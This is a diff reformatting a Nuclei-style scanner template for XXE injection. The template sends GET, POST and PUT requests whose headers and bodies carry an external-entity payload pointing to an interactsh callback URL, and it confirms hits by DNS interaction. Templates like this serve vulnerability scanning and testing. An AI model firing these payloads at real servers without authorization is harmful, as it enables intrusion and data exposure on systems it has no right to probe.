@@ -1,12 +1,21 @@
 id: XXE_injection
+
 info:
   name: XXE-injection
   author: MR.iambatman
   severity: high
   description: XXE
+
 requests:
   - raw:
-      - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n§header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] > \nConnection: close\n< ! DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{{interactsh-url}}\"> %xxe; ] >\n"
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] > 
+        Connection: close
+        < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -15,6 +24,7 @@ requests:
         Connection: close
         Content-Type: application/x-www-form-urlencoded
         < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+
       - |
         PUT / HTTP/1.1
         Host: {{Hostname}}
@@ -23,10 +33,13 @@ requests:
         Connection: close
         Content-Type: application/x-www-form-urlencoded
         < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
+    
     payloads:
-      header: helpers/payloads/request-headers.txt
+      header: helpers/payloads/request-headers.txt   
+    
     attack: clusterbomb
     redirects: true
+   
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the DNS Interaction
